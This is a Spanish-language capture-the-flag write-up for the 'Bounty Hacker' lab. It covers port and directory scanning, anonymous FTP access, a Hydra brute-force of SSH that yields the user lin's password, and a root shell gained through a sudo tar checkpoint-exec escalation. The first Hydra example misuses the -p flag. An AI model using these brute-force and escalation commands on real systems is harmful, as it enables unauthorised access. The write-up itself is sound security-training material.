# Bounty Hacker 
---

## 1. Fase de reconocimiento

 `nmap -Pn -sS -sV -sC -T4 -vv 10.10.149.146`

 ***Resultado:***
| PORT |    STATE | SERVICE |       REASON       |  VERSION |
|------|----------|---------|--------------------|----------|
|20/tcp|closed ftp-data |        reset ttl 63 |
|21/tcp|    open  | ftp  |           syn-ack ttl 63 | vsftpd 3.0.5 | 
|22/tcp|   open  | ssh   |          syn-ack ttl 63  | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) |
|80/tcp|    open  | http  |          syn-ack ttl 63 | Apache httpd 2.4.41 ((Ubuntu)) |
---
Puerto 80 abierto, significa que una pagina web esta corriendo. 
---
## 2. Fase de enumeracion activa 
Utilizaremos Gobuster para la busqueda de directorios ocultos.
|directorio |	estatus |	tamaño |	redireccion |
|-----------|---------|--------|-------------|
|/.hta |                (Status: 403) | [Size: 277] |
|/.htaccess |           (Status: 403) | [Size: 277] |
|/.htpasswd |           (Status: 403) | [Size: 277] |
|/images |              (Status: 301) | [Size: 313] | [--> http://10.10.231.44/images/] |
|/index.html |          (Status: 200) | [Size: 969] |
|/javascript |          (Status: 301) | [Size: 317] | [--> http://10.10.231.44/javascript/] |
|/server-status |       (Status: 403) | [Size: 277] |
---
#### Luego de revisar manualmente cada dirección descubierta (como /index.html, /images/ y /javascript/). No se encontraron nuevos elementos relevantes. Dado que la enumeración en el puerto 80 no arrojó pistas útiles, el siguiente enfoque será apuntar al puerto 21 (FTP), identificado previamente con Nmap como un servicio vsftpd 3.0.5, para intentar enumerar y explotar posibles vulnerabilidades.
---
## Enumeración Activa (Continuación)
Nos conectamos al servicio FTP utilizando el comando `ftp 10.10.231.44` y realizamos un inicio de sesión (login) con el usuario **anonymous**. Luego, listamos los archivos disponibles con el comando `ls -la`.
Archivos encontrados
Vemos los siguientes archivos:

- -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
- -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

#### Descarga de archivos
Descargamos los archivos utilizando el comando `get <archivo>` para cada uno (por ejemplo, get locks.txt y get task.txt).
---
### Revisión de los archivos descargados
Analizamos el contenido de los archivos descargados con los siguientes comandos:

- cat locks.txt
- cat task.txt

Contenido de los archivos

- locks.txt: Contiene un listado de contraseñas. Esto nos permite utilizarlos como base para un ataque de fuerza bruta. Se puede emplear Hydra con el siguiente comando:
`hydra -L locks.txt -p locks.txt ssh://<ip>`
---
**task.txt: Encontramos algo interesante. Su contenido es:**

`cat task.txt`

`Protect Vicious.`

`Plan for Red Eye pickup on the moon.`

`-lin`

---
#### Encontramos un usuario lin
Basándonos en el archivo task.txt, identificamos un usuario potencial llamado lin. Ahora utilizaremos Hydra para intentar crackear la contraseña de este usuario en el servicio SSH con el siguiente comando:
`hydra -l lin -P locks.txt -t 4 10.10.231.44 ssh`

Conseguimos la contraseña: 
|Usuario | Contraseña |
|--------|------------|
|Lin | RedDr4gonSynd1cat3 |

---
### Acceso vía SSH
Nos conectamos al servicio SSH utilizando las credenciales obtenidas (lin:RedDr4gonSynd1cat3) con el siguiente comando:
`ssh lin@10.10.231.44`
Una vez dentro, ejecutamos ls y observamos la carpeta user.txt. Al inspeccionarla, encontramos la primera flag.

---
# Escalamiento de privilegios
Para identificar los permisos disponibles, utilizamos el comando `sudo -l`. Esto reveló que tenemos permisos de root para el binario **/bin/tar**.
Buscamos en GTFOBins (a través de un navegador) una técnica para escalar privilegios utilizando **/bin/tar**. Encontramos que podemos obtener una shell de root con el siguiente comando:
`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

---
#### Obtención de privilegios root
- Con este comando, conseguimos privilegios de root. Para localizar el archivo root.txt, ejecutamos:
`find / -name "root.txt" 2>/dev/null`

- El comando devuelve la ruta /root/root.txt. Usamos cat para extraer la segunda flag:
`cat /root/root.txt`

(～￣▽￣)～
